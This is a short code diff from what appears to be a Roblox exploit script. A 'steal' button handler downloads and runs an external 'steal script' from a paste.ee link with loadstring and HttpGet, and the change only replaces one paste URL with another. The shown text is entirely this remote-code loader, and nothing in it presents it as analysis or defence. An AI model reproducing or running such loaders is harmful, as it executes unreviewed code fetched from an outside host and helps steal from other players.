@@ -126,7 +126,7 @@ stealBtn.MouseButton1Click:Connect(function()
         
         -- Run external steal script
         local success, err = pcall(function()
-            loadstring(game:HttpGet("https://paste.ee/r/bUXaWrcz"))()
+            loadstring(game:HttpGet("https://paste.ee/r/je0WxTXc"))()
         end)
         if not success then
             warn("Error loading steal script: "..tostring(err))
